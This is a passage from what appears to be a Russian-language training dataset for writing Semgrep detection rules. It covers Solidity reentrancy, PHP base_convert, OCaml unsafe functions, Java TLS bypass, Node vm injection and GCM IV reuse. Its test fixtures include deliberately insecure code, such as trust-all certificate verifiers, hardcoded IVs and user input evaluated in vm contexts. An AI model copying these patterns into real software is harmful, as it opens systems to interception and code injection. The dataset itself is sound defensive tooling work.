    "input": "Требования:\n- Язык: solidity\n- Тип анализа: search\n- CWE: C\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: balancer-readonly-reentrancy-getrate.sol\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract BALBBA3USDOracle is IOracle, IOracleValidate {\n\n    function _get() internal view returns (uint256) {\n        uint256 usdcLinearPoolPrice = _getLinearPoolPrice(BAL_BB_A3_USDC);\n        uint256 usdtLinearPoolPrice = _getLinearPoolPrice(BAL_BB_A3_USDT);\n        uint256 daiLinearPoolPrice = _getLinearPoolPrice(BAL_BB_A3_DAI);\n\n        uint256 minValue = Math.min(\n        Math.min(usdcLinearPoolPrice, usdtLinearPoolPrice),\n        daiLinearPoolPrice\n        );  \n        // ruleid: balancer-readonly-reentrancy-getrate\n        return (BAL_BB_A3_USD.getRate() * minValue) / 1e18;\n    }\n\n    function check() internal view returns (uint256) {\n        \n        VaultReentrancyLib.ensureNotInVaultContext(IVault(BALANCER_VAULT));\n        // ok: balancer-readonly-reentrancy-getrate\n        return (BAL_BB_A3_USD.getRate() * minValue) / 1e18;\n    }\n\n}\n\ncontract PoolRecoveryHelper is SingletonAuthentication {\n\n    function _updateTokenRateCache(\n        uint256 index,\n        IRateProvider provider,\n        uint256 duration\n    ) internal virtual {\n        // ok: balancer-readonly-reentrancy-getrate\n        uint256 rate = provider.getRate();\n        bytes32 cache = _tokenRateCaches[index];\n\n        _tokenRateCaches[index] = cache.updateRateAndDuration(rate, duration);\n\n        emit TokenRateCacheUpdated(index, rate);\n    }\n}\n\n\ncontract TestA {\n    function checkReentrancy() {\n        VaultReentrancyLib.ensureNotInVaultContext(IVault(BALANCER_VAULT));\n    }\n\n    function test() internal view returns (uint256) {\n        checkReentrancy();\n        // ok: balancer-readonly-reentrancy-getrate\n        return (BAL_BB_A3_USD.getRate() * minValue) / 1e18;\n    }\n\n    function test2() internal view returns (uint256) {\n        \n        // ruleid: balancer-readonly-reentrancy-getrate\n        return (BAL_BB_A3_USD.getRate() * minValue) / 1e18;\n    }\n}\n\ncontract TestB {\n    function c  # Ограничиваем длину\n\nОпасные паттерны:\n• // ruleid: balancer-readonly-reentrancy-getrate\nreturn (BAL_BB_A3_USD.getRate() * minValue) / 1e18;\n• function $F(...) {\n...\nBAL_BB_A3_USD.getRate();\n...}\n• function $F(...) {\n...\n$VAR.getRate();\n...}\n\nБезопасные паттерны:  \n• function $F(...) {\n...\nVaultReentrancyLib.ensureNotInVaultContext(...);\n...}\n• function $F(...) {\n...\n$VAULT.manageUserBalance(...);\n...}\n• function $F(...) {\n...\nBAL_BB_A3_USD.getRate();\n...\nVaultReentrancyLib.ensureNotInVaultContext(...);}\n\nЛегенда аннотаций:\n- // ruleid:balancer-readonly-reentrancy-getrate: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:balancer-readonly-reentrancy-getrate: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: balancer-readonly-reentrancy-getrate\n    message: $VAR.getRate() call on a Balancer pool is not protected from the read-only reentrancy.\n    metadata:\n      category: security\n      technology:\n          - solidity\n      cwe: \"CWE-841: Improper Enforcement of Behavioral Workflow\"\n      confidence: HIGH\n      likelihood: MEDIUM\n      impact: HIGH\n      subcategory:\n          - vuln\n      references: \n        - https://forum.balancer.fi/t/reentrancy-vulnerability-scope-expanded/4345\n    patterns:\n      - pattern: |\n          function $F(...) {\n            ...\n            $VAR.getRate();\n            ...\n          }\n      - pattern-not-inside: |\n          function $F(...) {\n            ...\n            VaultReentrancyLib.ensureNotInVaultContext(...);\n            ...\n          }\n      - pattern-not-inside: |\n          function $F(...) {\n            ...\n            $VAULT.manageUserBalance(...);\n            ...\n          }\n      - pattern-not-inside: |\n          function _updateTokenRateCache(...) {\n            ...\n          }\n      - pattern-not-inside: |\n          contract PoolRecoveryHelper {\n            ...\n          }\n      - pattern-not-inside: |\n          contract ComposableStablePoolRates {\n            ...\n          }\n      - pattern-not-inside: |\n          contract WeightedPoolProtocolFees {\n            ...\n          }\n      - pattern-not-inside: |\n            contract $C {\n              ...\n              function $CHECKFUNC(...) {\n                ...\n                VaultReentrancyLib.ensureNotInVaultContext(...);\n                ...\n              }\n              ...\n              function $F(...) {\n                ...\n                $CHECKFUNC(...);\n                ...\n                $VAR.getRate();\n                ...\n              }\n              ...\n            }\n      - pattern-not-inside: |\n            contract $C {\n              ...\n              function $CHECKFUNC(...) {\n                ...\n                VaultReentrancyLib.ensureNotInVaultContext(...);\n                ...\n              }\n              ...\n              function $F(...) {\n                ...\n                $VAR.getRate();\n                ...\n                $CHECKFUNC(...);\n                ...\n              }\n              ...\n            }\n      - pattern-not-inside: |\n            contract $C {\n              ...\n              function $CHECKFUNC(...) {\n                ...\n                $VAULT.manageUserBalance(...);\n                ...\n              }\n              ...\n              function $F(...) {\n                ...\n                $VAR.getRate();\n                ...\n                $CHECKFUNC(...);\n                ...\n              }\n              ...\n            }\n      - pattern-not-inside: |\n            contract $C {\n              ...\n              function $CHECKFUNC(...) {\n                ...\n                $VAULT.manageUserBalance(...);\n                ...\n              }\n              ...\n              function $F(...) {\n                ...\n                $CHECKFUNC(...);\n                ...\n                $VAR.getRate();\n                ...\n              }\n              ...\n            }\n      - focus-metavariable: $VAR\n    languages:\n      - solidity\n    severity: ERROR\n\n# Логика правила:\n['Тип анализа: поиск ($search)$VAR.getRate() вызова внутри функции.', 'Структура паттернов: используются pattern/pattern-not и focus-метавариабельная переменная $VAR.', 'Комбинация условий: используется оператор ИЛИ между паттернами, исключающими контексты с обеспечением защиты от реентерабельной ошибки через VaultReentrancyLib.ensureNotInVaultContext или manageUserBalance.', 'Метапеременные: метапеременная $VAR представляет собой имя переменной, вызывающей getRate().']\n\n# Ключевые элементы:\n- ID: balancer-readonly-reentrancy-getrate\n- Язык: solidity \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "balancer-readonly-reentrancy-getrate",
      "language": "solidity",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: base-convert-loses-precision\nОписание уязвимости: The function base_convert uses 64-bit numbers internally, and does not correctly convert large numbers. It is not suitable for random tokens such as those used for session tokens or CSRF tokens.\nCWE: CWE-190: Integer Overflow or Wraparound\nТип анализа: taint\nЯзык: php\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле\nСпособы санитации: определены в правиле",
    "input": "Требования:\n- Язык: php\n- Тип анализа: taint\n- CWE: CWE-190: Integer Overflow or Wraparound\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: base-convert-loses-precision.php\n<?php\n\n$command = $secret = $counter = $uid = $totalColors = $i = $row = $value = $numeric = $string = '1';\n$getRandomNumber = 'rand';\n\n// ok: base-convert-loses-precision\nvar_dump(base_convert(\"0775\", 8, 10));\n\n// ruleid: base-convert-loses-precision\n$token = base_convert(bin2hex(hash('sha256', uniqid(mt_rand(), true), true)), 16, 36);\n\n// ruleid: base-convert-loses-precision\nbase_convert(hash_hmac('sha256', $command . ':' . $token, $secret), 16, 36);\n\n// ruleid: base-convert-loses-precision\n$randString = base_convert(sha1(uniqid(mt_rand(), true)), 16, 36);\n\n// ok: base-convert-loses-precision\n$token = 'gleez_profiler/'.base_convert($counter++, 10, 32);\n\n// ok: base-convert-loses-precision\n$color1Index = base_convert(substr($uid, 0, 2), 16, 10) % $totalColors;\n\n// ruleid: base-convert-loses-precision\n$uniqueId = substr(base_convert(md5(uniqid(rand(), true)), 16, 36), 1, 20);\n\n// ruleid: base-convert-loses-precision\n$token = base_convert(sha1($i),7, 36);\n\n// ok: base-convert-loses-precision\n$id_converted = base_convert($row, 10, 36);\n\n// ok: base-convert-loses-precision\n$value = base_convert(substr($value, 2), 16, 10);\n\n// ok: base-convert-loses-precision\nbase_convert(rand(1, 1000000000), 10, 36);\n\n// ruleid: base-convert-loses-precision\n$salt = base_convert(bin2hex(random_bytes(20)), 16, 36);\n\n// taking only 7 hex chars makes it fit into a 64-bit integer\n$stringHash = substr(md5($string), 0, 7);\n// ok: base-convert-loses-precision\nbase_convert($stringHash, 16, 10);\n\n$stringHash = substr(md5($string), 0, 8);\n// ruleid: base-convert-loses-precision\nbase_convert($stringHash, 16, 10);\n\n// ruleid: base-convert-loses-precision\n$seed = base_convert(md5(microtime().$_SERVER['DOCUMENT_ROOT']), 16, $numeric ? 10 : 35);\n\n$bytes = random_bytes(32);\n// ruleid: base-convert-loses-precision\nbase_convert(bin2hex($bytes), 16, 36);\n\n// ruleid: base-convert-loses-precision\n$salt = base_convert(bin2hex(random_bytes(20)), 16, 36);\n\n// ruleid: b  # Ограничиваем длину\n\nОпасные паттерны:\n• base_convert(bin2hex(hash('sha256', uniqid(mt_rand(), true), true)), 16, 36)\n• base_convert(hash_hmac('sha256', $command . ':' . $token, $secret), 16, 36)\n• base_convert(sha1(uniqid(mt_rand(), true)), 16, 36)\n\nБезопасные паттерны:  \n• base_convert('0775', 8, 10)\n• base_convert($counter++, 10, 32)\n• base_convert(substr($uid, 0, 2), 16, 10) % $totalColors\n\nЛегенда аннотаций:\n- // ruleid:base-convert-loses-precision: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:base-convert-loses-precision: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: base-convert-loses-precision\n  message: >-\n    The function base_convert uses 64-bit numbers internally, and does not correctly convert large numbers.\n    It is not suitable for random tokens such as those used for session tokens or CSRF tokens.\n  metadata:\n    references:\n    - https://www.php.net/base_convert\n    - https://www.sjoerdlangkemper.nl/2017/03/15/dont-use-base-convert-on-random-tokens/\n    category: security\n    technology:\n    - php\n    cwe:\n    - 'CWE-190: Integer Overflow or Wraparound'\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: HIGH\n  languages: [php]\n  severity: WARNING\n  mode: taint\n  pattern-sources:\n    - pattern: hash(...)\n    - pattern: hash_hmac(...)\n    - pattern: sha1(...)\n    - pattern: md5(...)\n    - patterns:\n      - pattern: random_bytes($N)\n      - metavariable-comparison:\n          metavariable: $N\n          comparison: $N > 7\n    - patterns:\n      - pattern: openssl_random_pseudo_bytes($N)\n      - metavariable-comparison:\n          metavariable: $N\n          comparison: $N > 7\n    - patterns:\n      - pattern: $OBJ->get_random_bytes($N)\n      - metavariable-comparison:\n          metavariable: $N\n          comparison: $N > 7\n  pattern-sinks:\n    - pattern: base_convert(...)\n  pattern-sanitizers:\n    - patterns:\n        - pattern: substr(..., $LENGTH)\n        - metavariable-comparison:\n            metavariable: $LENGTH\n            comparison: $LENGTH <= 7\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования функции base_convert в PHP, которая внутренне использует 64-битные числа и не корректно обрабатывает большие числа. Правило ищет вызовы функций, которые могут генерировать случайные токены или другие большие значения, и передает их в base_convert. Источниками считаются хеш-функции (hash, hash_hmac), SHA1, MD5, а также генерация случайных байтов через random_bytes, openssl_random_pseudo_bytes и методы объектов, возвращающие случайные байты. Синиками являются вызовы base_convert с основанием 16 и результатом преобразования, превышающим 64 бита. Безопасными считаются случаи, когда длина подстроки после substr меньше или равна 7, так как это гарантирует, что результат останется внутри допустимого диапазона 64-битного целого числа.\n\n# Ключевые элементы:\n- ID: base-convert-loses-precision\n- Язык: php \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "base-convert-loses-precision",
      "language": "php",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения: ocamllint-unsafe\nОписание уязвимости: Unsafe functions do not perform boundary checks or have other side effects, use with care.\nCWE: C\nТип анализа: search\nЯзык: ocaml",
    "input": "Требования:\n- Язык: ocaml\n- Тип анализа: search\n- CWE: C\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: unsafe.ml\nlet cb = Array.make 10 2 in\n(* ruleid:ocamllint-unsafe *)\nPrintf.printf \"%d\\n\" (Array.unsafe_get cb 12)  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: unsafe.ml\nlet cb = Array.make 10 2 in\n(* ruleid:ocamllint-unsafe *)\nPrintf.printf \"%d\\n\" (Array.unsafe_get cb 12)\n• // File: another_unsafe.ml\nlet arr = Bytes.create 10 \"test\" in\n(* ruleid:ocamllint-unsafe *)\nPrintf.printf \"%s\\n\" (Bytes.unsafe_to_string arr)\n• // File: more_unsafe.ml\nlet fd = Unix.open_connection \"localhost\" in\n(* ruleid:ocamllint-unsafe *)\nUnix.unsafe_sendto fd \"data\" 0 10\n\nБезопасные паттерны:  \n• // File: safe.ml\nlet cb = Array.make 10 2 in\nPrintf.printf \"%d\\n\" (Array.get cb 5)\n• // File: safer.ml\nlet arr = Bytes.create 10 \"test\" in\nPrintf.printf \"%s\\n\" (Bytes.sub arr 0 4)\n• // File: safest.ml\nlet fd = Unix.open_connection \"localhost\" in\nUnix.sendto fd \"data\" 0 10\n\nЛегенда аннотаций:\n- // ruleid:ocamllint-unsafe: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:ocamllint-unsafe: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: ocamllint-unsafe\n    pattern-either:\n      - pattern: $X.unsafe_get        # oob array access\n      - pattern: $X.unsafe_set        # oob array access\n      - pattern: $X.unsafe_to_string    # requires unique ownership\n      - pattern: $X.unsafe_of_string    # requires unique ownership\n      - pattern: $X.unsafe_blit\n      - pattern: $X.unsafe_blit_string\n      - pattern: $X.unsafe_fill\n      - pattern: $X.unsafe_to_string\n      - pattern: $X.unsafe_getenv\n      - pattern: $X.unsafe_environment\n      - pattern: $X.unsafe_chr        # possibly wrong output for int > 255\n      - pattern: $X.unsafe_of_int\n      - pattern: $X.unsafe_output\n      - pattern: $X.unsafe_output_string\n      - pattern: $X.unsafe_read\n      - pattern: $X.unsafe_recv\n      - pattern: $X.unsafe_recvfrom\n      - pattern: $X.unsafe_send\n      - pattern: $X.unsafe_sendto\n      - pattern: $X.unsafe_set\n      - pattern: $X.unsafe_set_int16\n      - pattern: $X.unsafe_set_int32\n      - pattern: $X.unsafe_set_int64\n      - pattern: $X.unsafe_set_int8\n      - pattern: $X.unsafe_set_uint16_ne\n      - pattern: $X.unsafe_set_uint8\n      - pattern: $X.unsafe_single_write\n      - pattern: $X.unsafe_string\n      - pattern: $X.unsafe_sub\n      - pattern: $X.unsafe_write \n    message: Unsafe functions do not perform boundary checks or have other side effects, use with care.\n    languages: [ocaml]\n    severity: WARNING\n    metadata:\n      category: security\n      references:\n      - https://v2.ocaml.org/api/Bigarray.Array1.html#VALunsafe_get\n      - https://v2.ocaml.org/api/Bytes.html#VALunsafe_to_string\n      technology:\n        - ocaml\n      cwe: \"CWE-242: Use of Inherently Dangerous Function (4.12)\"\n      confidence: MEDIUM\n      likelihood: MEDIUM\n      impact: MEDIUM\n      subcategory:\n        - audit\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования небезопасных функций в языке OCaml, которые не выполняют проверку границ или имеют другие побочные эффекты. Паттерн использует оператор 'pattern-either' для объединения нескольких шаблонов, соответствующих различным небезопасным функциям, таким как 'unsafe_get', 'unsafe_set', 'unsafe_to_string' и другим. Эти функции потенциально могут привести к ошибкам выхода за границы массива или другим проблемам безопасности.\n\n# Ключевые элементы:\n- ID: ocamllint-unsafe\n- Язык: ocaml \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "ocamllint-unsafe",
      "language": "ocaml",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: bypass-tls-verification\nОписание уязвимости: Checks for redefinitions of functions that check TLS/SSL certificate verification. This can lead to vulnerabilities, as simple errors in the code can result in lack of proper certificate validation. This should only be used for debugging purposes because it leads to vulnerability to MTM attacks.\nCWE: C\nТип анализа: search\nЯзык: java",
    "input": "Требования:\n- Язык: java\n- Тип анализа: search\n- CWE: C\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: bypass-tls-verification.java\npublic class Bad {\n    public void bad1() {\n        // ruleid: bypass-tls-verification\n        HttpsURLConnection.setDefaultHostnameVerifier(new HostnameVerifier() {\n                public boolean verify(String hostname, SSLSession session) {\n                    return true;\n                }\n            });\n    }\n\n    // ruleid: bypass-tls-verification\n    public RestTemplate restTemplate()\n                        throws KeyStoreException, NoSuchAlgorithmException, KeyManagementException {\n            TrustStrategy acceptingTrustStrategy = (X509Certificate[] chain, String authType) -> true;\n\n            SSLContext sslContext = org.apache.http.ssl.SSLContexts.custom()\n                            .loadTrustMaterial(null, acceptingTrustStrategy)\n                            .build();\n\n            SSLConnectionSocketFactory csf = new SSLConnectionSocketFactory(sslContext);\n\n            CloseableHttpClient httpClient = HttpClients.custom()\n                            .setSSLSocketFactory(csf)\n                            .build();\n\n            HttpComponentsClientHttpRequestFactory requestFactory =\n                            new HttpComponentsClientHttpRequestFactory();\n\n            requestFactory.setHttpClient(httpClient);\n            RestTemplate restTemplate = new RestTemplate(requestFactory);\n            return restTemplate;\n    }\n\n    public RestTemplate getRestTemplate() throws KeyStoreException, NoSuchAlgorithmException, KeyManagementException {\n        // ruleid: bypass-tls-verification\n        TrustStrategy acceptingTrustStrategy = new TrustStrategy() {\n            @Override\n            public boolean isTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException {\n                return true;\n            }\n        };\n        SSLContext sslContext = org.apache.http.ssl.SSLContexts.custom().loadTrustMaterial(null, acceptingTrustStrategy).build();\n        SSLConnectionSocketFactory csf = new SSLConnectionS  # Ограничиваем длину\n\nОпасные паттерны:\n• new HostnameVerifier() {\n    ...\n    public boolean verify(String hostname, SSLSession session) {\n        return true;\n    }\n    ...\n};\n• public RestTemplate restTemplate() throws KeyStoreException, NoSuchAlgorithmException, KeyManagementException {\n...\nTrustStrategy acceptingTrustStrategy = (X509Certificate[] chain, String authType) ->\n• TrustStrategy trustStrategy = new TrustStrategy() {\n...\npublic boolean isTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException {\n    return true;\n}\n...\n\nБезопасные паттерны:  \n• HttpsURLConnection.setDefaultHostnameVerifier(new HostnameVerifier() {\n    ...\n    public boolean verify(String hostname, SSLSession session) {\n        //some valid logic\n    }\n    ...\n});\n• public RestTemplate restTemplate() throws KeyStoreException, NoSuchAlgorithmException, KeyManagementException {\n...\nTrustStrategy acceptingTrustStrategy = (X509Certificate[] chain, String authType) ->\n• TrustStrategy trustStrategy = new TrustStrategy() {\n...\npublic boolean isTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException {\n    //some valid logic\n}\n...\n\nЛегенда аннотаций:\n- // ruleid:bypass-tls-verification: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:bypass-tls-verification: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: bypass-tls-verification\n  message: >-\n    Checks for redefinitions of functions that check TLS/SSL certificate verification. This can lead to\n    vulnerabilities,\n    as simple errors in the code can result in lack of proper certificate validation.\n    This should only be used for debugging purposes because it leads to vulnerability to MTM attacks.\n  severity: WARNING\n  metadata:\n    likelihood: HIGH\n    impact: MEDIUM\n    confidence: MEDIUM\n    category: security\n    cwe: 'CWE-319: Cleartext Transmission of Sensitive Information'\n    owasp: 'A03:2017 - Sensitive Data Exposure'\n    references:\n    - https://stackoverflow.com/questions/4072585/disabling-ssl-certificate-validation-in-spring-resttemplate\n    - https://stackoverflow.com/questions/35530558/how-to-fix-unsafe-implementation-of-x509trustmanager-in-android-app?rq=1\n    subcategory:\n    - vuln\n    technology:\n    - spring\n    vulnerability: Insecure Transport\n  languages: [java]\n  pattern-either:\n  - pattern: |\n      new HostnameVerifier() {\n        ...\n        public boolean verify(String hostname, SSLSession session) {\n          ...\n        }\n        ...\n      };\n  - pattern: |\n      public RestTemplate restTemplate() throws KeyStoreException, NoSuchAlgorithmException, KeyManagementException {\n        ...\n        TrustStrategy $FUNCNAME = (X509Certificate[] chain, String authType) -> ...;\n        ...\n      }\n  - pattern: |\n      TrustStrategy $FUNCNAME= new TrustStrategy() {\n        ...\n        public boolean isTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException {\n          ...\n        }\n        ...\n      };\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска переопределений функций проверки TLS/SSL сертификата верификации, которые могут привести к недостаточной проверке сертификатов и уязвимостям типа Man-in-the-Middle (MTM). Анализируются три различных шаблона: первый шаблон ищет анонимный внутренний класс HostnameVerifier, второй шаблон ищет функцию restTemplate с параметром TrustStrategy, третий шаблон ищет определение класса TrustStrategy.\n\n# Ключевые элементы:\n- ID: bypass-tls-verification\n- Язык: java \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "bypass-tls-verification",
      "language": "java",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: vm-runincontext-injection\nОписание уязвимости: The `vm` module enables compiling and running code within V8 Virtual Machine contexts. The `vm` module is not a security mechanism. Do not use it to run untrusted code. If code passed to `vm` functions is controlled by user input it could result in command injection. Do not let user input in `vm` functions.\nCWE: CWE-94: Improper Control of Generation of Code ('Code Injection')\nТип анализа: taint\nЯзык: javascript\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: javascript\n- Тип анализа: taint\n- CWE: CWE-94: Improper Control of Generation of Code ('Code Injection')\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: vm-runincontext-injection.js\nconst vm = require('vm')\n\nexports.handler = async (event) => {\n    var input = event['something']\n    var sandbox = {\n        foo: input\n    }\n    // ruleid: vm-runincontext-injection\n    vm.runInNewContext('safeEval(orderLinesData)', sandbox, { timeout: 2000 })\n\n\n    const code = `\n        var x = ${event['something']};\n    `\n    // ruleid: vm-runincontext-injection\n    vm.runInThisContext(code)\n\n\n    const parsingContext = vm.createContext({name: 'world'})\n    const code1 = `return 'hello ' + '${event['something']}'`\n    // ruleid: vm-runincontext-injection\n    const fn1 = vm.compileFunction(code1, [], { parsingContext })\n\n\n    const context = vm.createContext({name: event['something']})\n    const code2 = `return 'hello ' name`\n    // ruleid: vm-runincontext-injection\n    const fn2 = vm.compileFunction(code2, [], { parsingContext: context })\n\n\n    // ruleid: vm-runincontext-injection\n    const script = new vm.Script(`\n        function add(a, b) {\n          return a + ${event['something']};\n        }\n\n        const x = add(1, 2);\n    `);\n    script.runInThisContext();\n\n\n    // ok: vm-runincontext-injection\n    var sandbox2 = {\n        foo: 1\n    }\n    vm.createContext(sandbox2)\n    vm.runInContext('safeEval(orderLinesData)', sandbox2, { timeout: 2000 })\n\n\n    // ok: vm-runincontext-injection\n    var sandbox3 = {\n        foo: 1\n    }\n    vm.runInNewContext('safeEval(orderLinesData)', sandbox3, { timeout: 2000 })\n\n\n    const code2 = `\n        var x = 1;\n    `\n    // ok: vm-runincontext-injection\n    vm.runInThisContext(code2)\n\n\n    const parsingContext = vm.createContext({name: 'world'})\n    const code3 = `return 'hello ' + name`\n    // ok: vm-runincontext-injection\n    const fn3 = vm.compileFunction(code3, [], { parsingContext })\n\n\n    // ok: vm-runincontext-injection\n    const script1 = new vm.Script(`\n        function add(a, b) {\n          return a + b;\n        }\n\n        const x = add(1, 2);\n    `);\n\n    script1.runInThisCont  # Ограничиваем длину\n\nОпасные паттерны:\n• vm.runInNewContext('safeEval(orderLinesData)', sandbox, { timeout: 2000 })\n• vm.runInThisContext(code)\n• const fn1 = vm.compileFunction(code1, [], { parsingContext })\n\nБезопасные паттерны:  \n• var sandbox2 = { foo: 1 }; vm.createContext(sandbox2); vm.runInContext('safeEval(orderLinesData)', sandbox2, { timeout: 2000 })\n• var sandbox3 = { foo: 1 }; vm.runInNewContext('safeEval(orderLinesData)', sandbox3, { timeout: 2000 })\n• const code2 = \n        var x = 1;\n    ; vm.runInThisContext(code2)\n\nЛегенда аннотаций:\n- // ruleid:vm-runincontext-injection: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:vm-runincontext-injection: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: vm-runincontext-injection\n  message: >-\n    The `vm` module enables compiling and running code within V8 Virtual Machine contexts.\n    The `vm` module is not a security mechanism. Do not use it to run untrusted code.\n    If code passed to `vm` functions is controlled by user input it could result in command injection.\n    Do not let user input in `vm` functions.\n  metadata:\n    owasp:\n    - A03:2021 - Injection\n    cwe:\n    - \"CWE-94: Improper Control of Generation of Code ('Code Injection')\"\n    category: security\n    technology:\n    - javascript\n    - aws-lambda\n    cwe2022-top25: true\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: MEDIUM\n    references:\n    - https://owasp.org/Top10/A03_2021-Injection\n  languages:\n  - javascript\n  - typescript\n  severity: ERROR\n  mode: taint\n  pattern-sources:\n  - patterns:\n    - pattern: $EVENT\n    - pattern-either:\n      - pattern-inside: |\n          exports.handler = function ($EVENT, ...) {\n            ...\n          }\n      - pattern-inside: |\n          function $FUNC ($EVENT, ...) {...}\n          ...\n          exports.handler = $FUNC\n      - pattern-inside: |\n          $FUNC = function ($EVENT, ...) {...}\n          ...\n          exports.handler = $FUNC\n  pattern-sinks:\n  - patterns:\n    - pattern-either:\n      - pattern-inside: |\n          require('vm');\n          ...\n      - pattern-inside: |\n          import 'vm'\n          ...\n    - pattern-either:\n      - pattern: $VM.runInContext($X,...)\n      - pattern: $VM.runInNewContext($X,...)\n      - pattern: $VM.runInThisContext($X,...)\n      - pattern: $VM.compileFunction($X,...)\n      - pattern: new $VM.Script($X,...)\n      - pattern: new $VM.SourceTextModule($X,...)\n      - pattern: runInContext($X,...)\n      - pattern: runInNewContext($X,...)\n      - pattern: runInThisContext($X,...)\n      - pattern: compileFunction($X,...)\n      - pattern: new Script($X,...)\n      - pattern: new SourceTextModule($X,...)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования небезопасных функций модуля 'vm' в JavaScript-коде. Анализ выполняется методом taint, отслеживая переменные, которые могут быть подвержены влиянию пользовательского ввода. В источнике (source) ищутся выражения, содержащие переменную '$EVENT', которая может представлять входные данные пользователя. В sinkах определяются вызовы функций модуля 'vm', таких как 'runInContext', 'runInNewContext', 'runInThisContext', 'compileFunction' и другие, где аргумент передается напрямую или через выражение, содержащее потенциально контролируемую пользователем переменную.\n\n# Ключевые элементы:\n- ID: vm-runincontext-injection\n- Язык: javascript \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "vm-runincontext-injection",
      "language": "javascript",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: gcm-detection\nОписание уязвимости: GCM detected, please check that IV/nonce is not reused, an Initialization Vector (IV) is a nonce used to randomize the encryption, so that even if multiple messages with identical plaintext are encrypted, the generated corresponding ciphertexts are different.Unlike the Key, the IV usually does not need to be secret, rather it is important that it is random and unique. Certain encryption schemes the IV is exchanged in public as part of the ciphertext. Reusing same Initialization Vector with the same Key to encrypt multiple plaintext blocks allows an attacker to compare the ciphertexts and then, with some assumptions on the content of the messages, to gain important information about the data being encrypted.\nCWE: CWE-323: Reusing a Nonce, Key Pair in Encryption\nТип анализа: search\nЯзык: kt",
    "input": "Требования:\n- Язык: kt\n- Тип анализа: search\n- CWE: CWE-323: Reusing a Nonce, Key Pair in Encryption\n- Серьезность: INFO\n\nКонтекст кода:\n// File: gcm-detection.kt\nimport javax.crypto.Cipher\nimport javax.crypto.KeyGenerator\nimport javax.crypto.SecretKey\nimport javax.crypto.spec.GCMParameterSpec\nimport javax.crypto.spec.SecretKeySpec\nimport java.util.Base64\n\npublic class GcmHardcodedIV\n{\n    fun byteArrayOfInts(vararg ints: Int) = Array<Byte>(ints.size) { pos -> ints[pos].toByte() }\n    public final val GCM_TAG_LENGTH: Int = 16\n    public final val BAD_IV: String = \"ab0123456789\"\n    public final val BAD_IV2 = byteArrayOfInts(0,1,2,3,4,5,6,7,8,9,10,11)\n\n    private val theIV: Array<Byte>\n    private val theKey: SecretKey\n\n    public fun main(args: Array<String>) : Void\n    {\n        val clearText: String = args[0]\n        System.out.println(clearText)\n\n        try {\n            setKeys()\n\n            val cipherText: String = encrypt(clearText)\n            System.out.println(cipherText)\n\n            val decrypted: String = decrypt(cipherText)\n            System.out.println(decrypted)\n        } catch(e: Exception) {\n            System.out.println(e.getMessage())\n        }\n    }\n\n    public fun encrypt(clearText: String): String {\n        // ruleid:gcm-detection\n        val cipher: Cipher = Cipher.getInstance(\"AES/GCM/NoPadding\")\n        val keySpec: SecretKeySpec= SecretKeySpec(theKey.getEncoded(), \"AES\")\n        val theBadIV: Array<Byte> = BAD_IV.getBytes()\n\n        // ruleid:gcm-detection\n        val gcmParameterSpec: GCMParameterSpec = GCMParameterSpec(GCM_TAG_LENGTH * 8, theBadIV)\n        cipher.init(Cipher.ENCRYPT_MODE, keySpec, gcmParameterSpec)\n\n        val cipherText: Array<Byte> = cipher.doFinal(clearText.getBytes())\n\n        val encoded = base64.getEncoder().encodeToString(cipherText)\n        return encoded\n    }\n\n    public fun decrypt(cipherText: String): String {\n        // ruleid:gcm-detection\n        val cipher: Cipher = Cipher.getInstance(\"AES/GCM/NoPadding\")\n        val keySpec: SecretKeySpec = SecretKeySpec(theKey.getEncoded(), \"AES\")\n\n        // ruleid:gcm-detection\n        val gcmPara  # Ограничиваем 